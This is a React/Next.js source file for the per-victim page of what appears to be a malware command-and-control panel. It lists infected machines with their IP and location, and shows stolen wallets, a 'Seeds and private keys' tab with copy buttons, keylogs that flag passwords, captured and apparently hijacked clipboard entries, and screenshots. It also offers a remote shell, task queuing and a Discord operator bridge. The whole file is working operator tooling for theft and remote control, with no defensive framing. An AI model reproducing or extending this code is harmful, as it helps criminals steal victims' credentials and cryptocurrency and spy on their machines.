'use client';
import { useState } from 'react';
import { useParams, useRouter } from 'next/navigation';
import { Copy, ExternalLink, Power, RefreshCw, Tag, TerminalSquare, Trash2 } from 'lucide-react';
import { toast } from 'sonner';
import { useApi, mutate } from '@/hooks/useApi';
import { useCanWrite, useRole } from '@/components/live-provider';
import { Topbar } from '@/components/topbar';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Dialog, DialogContent, DialogTitle } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { ErrorState, Empty, SkeletonRows } from '@/components/ui/table';
import { WalletTable } from '@/components/wallet-table';
import { FileTree } from '@/components/file-tree';
import { ConsolePanel } from '@/components/console-panel';
import { EventContent } from '@/components/event-content';
import { AgentConsole } from '@/components/agent-console';
import { TaskDialog } from '@/components/task-dialog';
import { TaskList } from '@/components/task-list';
import { ago, bytes, copy, dateTime, flag, osTone, short } from '@/lib/format';
import type { Artifact, ClipboardEntry, Keylog, Victim, Wallet } from '@/lib/types';

export default function VictimPage() {
  const { id } = useParams<{ id: string }>();
  const router = useRouter();
  const [dialog, setDialog] = useState(false);
  const [tagsOpen, setTagsOpen] = useState(false);
  const [tagText, setTagText] = useState('');
  const [busy, setBusy] = useState('');
  const canWrite = useCanWrite();
  const role = useRole();
  const bridge = useApi<{ enabled: boolean }>('/discord/status', { pollMs: 30_000 });
  const victim = useApi<Victim>(`/victims/${id}`, { pollMs: 10_000 });
  const wallets = useApi<{ items: Wallet[] }>(`/victims/${id}/wallets`, { pollMs: 10_000 });
  const seeds = useApi<{ items: Array<{ id: string; path: string; type: string; words: number; value: string; createdAt: string }> }>(`/victims/${id}/seeds`, { pollMs: 15_000 });
  const files = useApi<{ artifacts: Artifact[] }>(`/victims/${id}/files`);
  const [clipQuery, setClipQuery] = useState('');
  const clipboard = useApi<{ items: ClipboardEntry[] }>(`/victims/${id}/clipboard?q=${encodeURIComponent(clipQuery)}`);
  const [keyQuery, setKeyQuery] = useState('');
  const keylogs = useApi<{ items: Keylog[] }>(`/victims/${id}/keylogs?q=${encodeURIComponent(keyQuery)}&limit=200`);
  const screenshots = useApi<{ items: Array<{ id: string; ts: string; width: number | null; height: number | null }> }>(`/victims/${id}/screenshots`);
  const events = useApi<{ items: Array<{ id: string; kind: string; legacy: string; createdAt: string; data: Record<string, unknown> }> }>(`/victims/${id}/events`);

  if (victim.error) return <ErrorState message={victim.error.message} retry={victim.refresh} />;
  const data = victim.data;
  if (!data) return <div className="p-4"><SkeletonRows rows={14} /></div>;

  async function revoke() {
    setBusy('revoke');
    try {
      await mutate(`/victims/${id}/revoke`, 'POST');
      toast.success('Revocation toggled');
      victim.refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'revoke failed');
    } finally {
      setBusy('');
    }
  }

  async function remove() {
    const message = data?.discordChannel
      ? 'Delete this victim and all material? The Discord channel will be ignored and not recreated until you re-link it.'
      : 'Delete this victim and all material?';
    if (!confirm(message)) return;
    setBusy('delete');
    try {
      await mutate(`/victims/${id}`, 'DELETE');
      toast.success(data?.discordChannel ? 'Victim deleted and channel unlinked' : 'Victim deleted');
      router.push('/victims');
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'delete failed');
      setBusy('');
    }
  }

  async function relink() {
    if (!data?.discordChannel) return;
    setBusy('relink');
    try {
      await mutate(`/discord/ignored/${data.discordChannel}`, 'DELETE');
      toast.success('Channel queued for re-link');
      victim.refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 're-link failed');
    } finally {
      setBusy('');
    }
  }

  async function saveTags(event: React.FormEvent) {    event.preventDefault();
    setBusy('tags');
    try {
      await mutate(`/victims/${id}`, 'PATCH', { tags: tagText.split(',').map((tag) => tag.trim()).filter(Boolean) });
      setTagsOpen(false);
      victim.refresh();
    } catch (caught) {
      toast.error(caught instanceof Error ? caught.message : 'save failed');
    } finally {
      setBusy('');
    }
  }

  const taskBlocked = Boolean(bridge.data?.enabled) && !data.discordChannel;

  return (
    <>
      <Topbar title={data.hostname} subtitle={`${data.username} · ${data.os} · ${data.ip ?? 'no ip'} · seen ${ago(data.lastHeartbeatAt)} ago`} />
      <div className="space-y-3 pt-3">
        <div className="flex flex-wrap items-center gap-2">
          <Badge tone={data.online ? 'ok' : data.revokedAt ? 'bad' : 'warn'}>{data.online ? 'online' : data.status === 'online' ? 'stale' : data.status}</Badge>
          <Badge tone="brand">{data.profile}</Badge>
          {data.discordChannel ? <Badge tone="brand">discord</Badge> : <Badge>api</Badge>}
          {data.discordMissingAt ? <Badge tone="bad" title="Recreate the channel in Discord or re-link it from Victims">channel missing</Badge> : null}
          {data.discordIgnored ? <Badge tone="warn" title="The channel stays ignored after a victim delete">channel ignored</Badge> : null}
          {data.discordIgnored && data.discordChannel && role === 'admin' ? (
            <Button size="sm" variant="secondary" disabled={busy === 'relink'} loading={busy === 'relink'} onClick={relink}>re-link</Button>
          ) : null}
          <Badge>{data.agentVersion || 'no version'}</Badge>
          <span className="font-mono text-2xs text-muted">{short(data.id)} · {flag(data.countryCode)} {data.country ?? 'unknown'} {data.city ? `· ${data.city}` : ''}</span>
          <div className="ml-auto flex gap-1.5">
            <Button size="sm" variant="secondary" disabled={!canWrite || taskBlocked || busy === 'task'} title={taskBlocked ? 'Victim has no Discord channel' : undefined} onClick={() => setDialog(true)}><TerminalSquare className="h-3 w-3" /> task</Button>
            <Button size="sm" variant="secondary" disabled={!canWrite || busy === 'tags'} loading={busy === 'tags'} onClick={() => { setTagText(data.tags.join(', ')); setTagsOpen(true); }}><Tag className="h-3 w-3" /> tags</Button>
            <Button size="sm" variant="secondary" disabled={!canWrite || busy === 'revoke'} loading={busy === 'revoke'} onClick={revoke}><Power className="h-3 w-3" /> {data.revokedAt ? 'restore' : 'revoke'}</Button>
            <Button size="sm" variant="destructive" disabled={role !== 'admin' || busy === 'delete'} loading={busy === 'delete'} onClick={remove} title="delete and unlink"><Trash2 className="h-3 w-3" /></Button>
          </div>
        </div>

        <Tabs defaultValue="overview">
          <TabsList>
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="hardware">Hardware / net</TabsTrigger>
            <TabsTrigger value="wallets">Wallets ({wallets.data?.items.length ?? 0})</TabsTrigger>
            <TabsTrigger value="seeds">Seeds ({seeds.data?.items.length ?? 0})</TabsTrigger>
            <TabsTrigger value="files">Files</TabsTrigger>
            <TabsTrigger value="keylogs">Keylogs</TabsTrigger>
            <TabsTrigger value="clipboard">Clipboard</TabsTrigger>
            <TabsTrigger value="screens">Screens</TabsTrigger>
            <TabsTrigger value="console">Shell</TabsTrigger>
            <TabsTrigger value="agent">Agent</TabsTrigger>
            <TabsTrigger value="tasks">Tasks</TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="pt-3">
            <div className="grid grid-cols-2 gap-3">
              <Card>
                <CardHeader><CardTitle>System</CardTitle></CardHeader>
                <CardContent className="grid grid-cols-2 gap-y-2 text-xs">
                  <span className="text-muted">Hostname</span><span className="font-mono">{data.hostname}</span>
                  <span className="text-muted">User</span><span className="font-mono">{data.username}</span>
                  <span className="text-muted">OS</span><span className={osTone(data.os)}>{data.os} {data.osVersion}</span>
                  <span className="text-muted">Arch</span><span className="font-mono">{data.arch}</span>
                  <span className="text-muted">Agent</span><span className="font-mono">{data.agentVersion || '—'}</span>
                  <span className="text-muted">Build</span><span className="font-mono">{data.build?.name} v{data.build?.version}</span>
                </CardContent>
              </Card>
              <Card>
                <CardHeader><CardTitle>Network & presence</CardTitle><Button size="icon" variant="ghost" onClick={() => { copy(data.ip ?? ''); toast.success('IP copied'); }}><Copy className="h-3 w-3" /></Button></CardHeader>
                <CardContent className="grid grid-cols-2 gap-y-2 text-xs">
                  <span className="text-muted">IP</span><span className="font-mono">{data.ip ?? '—'}</span>
                  <span className="text-muted">Country</span><span>{flag(data.countryCode)} {data.country ?? '—'}</span>
                  <span className="text-muted">City</span><span>{data.city ?? '—'}</span>
                  <span className="text-muted">First seen</span><span className="font-mono">{dateTime(data.firstSeenAt)}</span>
                  <span className="text-muted">Last HB</span><span className="font-mono">{dateTime(data.lastHeartbeatAt)} ({ago(data.lastHeartbeatAt)} ago)</span>
                  <span className="text-muted">Artifacts</span><span className="num">{data._count?.artifacts ?? 0}</span>
                  {data.lat != null ? <><span className="text-muted">Map</span><a className="flex items-center gap-1 text-brand" target="_blank" href={`https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=12/${data.lat}/${data.lon}`}>open <ExternalLink className="h-2.5 w-2.5" /></a></> : null}
                </CardContent>
              </Card>
              <Card className="col-span-2">
                <CardHeader><CardTitle>Recent events</CardTitle></CardHeader>
                <CardContent className="space-y-1">
                  {(events.data?.items ?? []).length === 0 ? <p className="text-xs text-muted">No events</p> : null}
                  {(events.data?.items ?? []).slice(0, 12).map((event) => (
                    <div key={event.id} className="flex items-start gap-2 text-2xs">
                      <Badge tone="default">{event.kind}</Badge>
                      <EventContent kind={event.kind} data={event.data} legacy={event.legacy} />
                      <span className="ml-auto shrink-0 text-muted/60">{ago(event.createdAt)} ago</span>
                    </div>
                  ))}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="hardware" className="pt-3">
            <div className="grid grid-cols-2 gap-3">
              <Card><CardHeader><CardTitle>Hardware</CardTitle></CardHeader><CardContent className="grid grid-cols-2 gap-y-2 text-xs">
                <span className="text-muted">Arch</span><span className="font-mono">{data.arch}</span>
                <span className="text-muted">OS</span><span className={osTone(data.os)}>{data.os} {data.osVersion}</span>
                <span className="text-muted">Hostname</span><span className="font-mono">{data.hostname}</span>
                <span className="text-muted">User</span><span className="font-mono">{data.username}</span>
                <span className="text-muted">Agent</span><span className="font-mono">{data.agentVersion || '—'}</span>
                <span className="text-muted">Profile</span><span>{data.profile}</span>
              </CardContent></Card>
              <Card><CardHeader><CardTitle>Network</CardTitle></CardHeader><CardContent className="grid grid-cols-2 gap-y-2 text-xs">
                <span className="text-muted">IP</span><span className="font-mono">{data.ip ?? '—'}</span>
                <span className="text-muted">Country</span><span>{flag(data.countryCode)} {data.country ?? '—'}</span>
                <span className="text-muted">City</span><span>{data.city ?? '—'}</span>
                <span className="text-muted">Coordinates</span><span className="font-mono">{data.lat ?? '—'}, {data.lon ?? '—'}</span>
                <span className="text-muted">First seen</span><span className="font-mono">{dateTime(data.firstSeenAt)}</span>
                <span className="text-muted">Last heartbeat</span><span className="font-mono">{dateTime(data.lastHeartbeatAt)}</span>
              </CardContent></Card>
            </div>
          </TabsContent>

          <TabsContent value="wallets" className="pt-3">
            <Card><WalletTable victimId={id} items={wallets.data?.items ?? []} loading={wallets.loading} refresh={wallets.refresh} linked={!taskBlocked} /></Card>
          </TabsContent>

          <TabsContent value="seeds" className="pt-3">
            <Card>
              <CardHeader><CardTitle>Seeds and private keys</CardTitle><Button size="icon" variant="ghost" onClick={seeds.refresh}><RefreshCw className="h-3 w-3" /></Button></CardHeader>
              {seeds.loading ? <SkeletonRows rows={4} cols={3} /> : (seeds.data?.items ?? []).length === 0 ? (
                <Empty title="No seeds yet" hint="Queue scan_wallets. Seeds are extracted from wallet vaults and small text files." />
              ) : (
                <div className="divide-y divide-line/60">
                  {seeds.data!.items.map((seed) => (
                    <div key={seed.id} className="flex items-start gap-3 p-3">
                      <Badge tone={seed.value ? 'ok' : 'warn'}>{seed.type}</Badge>
                      <div className="min-w-0 flex-1">
                        <p className="break-all font-mono text-xs text-ink">{seed.value || '(value in artifact)'} </p>
                        <p className="text-2xs text-muted">{seed.words > 0 ? `${seed.words} words · ` : ''}{seed.path} · {dateTime(seed.createdAt)}</p>
                      </div>
                      {seed.value ? <Button size="icon" variant="ghost" onClick={() => { copy(seed.value); toast.success('Seed copied'); }}><Copy className="h-3 w-3" /></Button> : null}
                    </div>
                  ))}
                </div>
              )}
            </Card>
          </TabsContent>

          <TabsContent value="files" className="pt-3">
            <Card>{files.error ? <ErrorState message={files.error.message} retry={files.refresh} /> : <FileTree artifacts={files.data?.artifacts ?? []} onDeleted={files.refresh} />}</Card>
          </TabsContent>

          <TabsContent value="keylogs" className="pt-3">
            <Card>
              <div className="border-b border-line p-2"><Input value={keyQuery} onChange={(event) => setKeyQuery(event.target.value)} placeholder="search text or window" /></div>
              <div className="max-h-[540px] divide-y divide-line/60 overflow-y-auto">
                {keylogs.loading ? <SkeletonRows rows={8} cols={2} /> : (keylogs.data?.items ?? []).map((row) => (
                  <div key={row.id} className="p-2">
                    <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.title}{row.count && row.count > 1 ? ` · ×${row.count}` : ''}</p>
                    <p className={`font-mono text-xs ${row.password ? 'text-warn' : ''}`}>{row.text}</p>
                  </div>
                ))}
                {(keylogs.data?.items ?? []).length === 0 && !keylogs.loading ? <Empty title="No keylogs" /> : null}
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="clipboard" className="pt-3">
            <Card>
              <div className="border-b border-line p-2"><Input value={clipQuery} onChange={(event) => setClipQuery(event.target.value)} placeholder="search clipboard" /></div>
              <div className="max-h-[540px] divide-y divide-line/60 overflow-y-auto">
                {clipboard.loading ? <SkeletonRows rows={8} cols={2} /> : (clipboard.data?.items ?? []).map((row) => (
                  <div key={row.id} className="flex items-start gap-3 p-2">
                    <Badge tone={row.kind === 'text' ? 'default' : 'brand'}>{row.kind}</Badge>
                    <div className="min-w-0 flex-1">
                      <p className="break-all font-mono text-xs">{row.content}</p>
                      <p className="text-2xs text-muted">{dateTime(row.ts)} · {row.process} · {row.window}{row.replaced ? ` · replaced → ${row.replaced}` : ''}{row.count && row.count > 1 ? ` · ×${row.count}` : ''}</p>
                    </div>
                    <Button size="icon" variant="ghost" onClick={() => copy(row.content)}><Copy className="h-3 w-3" /></Button>
                  </div>
                ))}
                {(clipboard.data?.items ?? []).length === 0 && !clipboard.loading ? <Empty title="No clipboard entries" /> : null}
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="screens" className="pt-3">
            <Card>
              <CardContent className="grid grid-cols-3 gap-2">
                {(screenshots.data?.items ?? []).map((shot) => (
                  <a key={shot.id} href={`/api/console/screenshots/${shot.id}/image`} target="_blank" className="group overflow-hidden rounded border border-line">
                    <img src={`/api/console/screenshots/${shot.id}/image`} alt="screenshot" loading="lazy" className="aspect-video w-full object-cover transition-opacity group-hover:opacity-80" />
                    <p className="p-1 text-2xs text-muted">{dateTime(shot.ts)}</p>
                  </a>
                ))}
              </CardContent>
              {(screenshots.data?.items ?? []).length === 0 ? <Empty title="No screenshots" hint="Queue the screenshot task." /> : null}
            </Card>
          </TabsContent>

          <TabsContent value="console" className="pt-3"><Card><ConsolePanel victimId={id} /></Card></TabsContent>

          <TabsContent value="agent" className="pt-3">
            <Card><AgentConsole victimId={id} /></Card>
          </TabsContent>

          <TabsContent value="tasks" className="pt-3"><Card><TaskList victim={id} /></Card></TabsContent>
        </Tabs>
      </div>

      <TaskDialog open={dialog} onOpenChange={setDialog} victimIds={[id]} victims={[data]} linked={!taskBlocked} />
      <Dialog open={tagsOpen} onOpenChange={setTagsOpen}>
        <DialogContent>
          <DialogTitle>Edit tags</DialogTitle>
          <form onSubmit={saveTags} className="mt-3 space-y-2">
            <Input value={tagText} onChange={(event) => setTagText(event.target.value)} placeholder="miner, lab, vip" />
            <div className="flex justify-end"><Button type="submit">Save</Button></div>
          </form>
        </DialogContent>
      </Dialog>
    </>
  );
}
